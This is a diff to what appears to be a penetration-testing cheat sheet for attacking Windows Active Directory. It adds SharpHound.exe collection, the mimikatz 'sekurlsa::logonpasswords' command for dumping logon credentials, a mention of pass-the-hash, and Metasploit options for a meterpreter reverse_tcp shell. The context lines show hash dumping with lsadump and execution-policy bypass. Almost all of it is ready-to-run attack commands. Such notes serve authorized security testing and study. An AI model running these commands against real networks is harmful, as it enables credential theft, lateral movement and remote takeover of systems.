@@ -94,6 +94,10 @@ powershell -ep bypass
 .\Downloads\SharpHound.ps1
 
 Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN.local -ZipFileName loot.zip
+
+OR (alternative)
+
+SharpHound.exe
 ```
 
 Upload zip file into bloodhound.
@@ -114,7 +118,16 @@ Dump hashes
 lsadump::lsa /patch
 ```
 
-Take hashes offline and crack the hashes
+Login passwords
+
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+Take hashes offline and crack the hashes or run attacks like pass the hash.
+
+[Further Information](https://github.com/gentilkiwi/mimikatz/wiki)
+
 
 ### Golden Ticket
 
@@ -339,8 +352,10 @@ set smbdomain
 set smbpass
 set smbuser
 show targets
+set targets 2 (native upload)
 set payload windows/x64/meterpreter/reverse_tcp
 set lhost
+set lport
 ```
 
 On a meterpreter shell load incognito
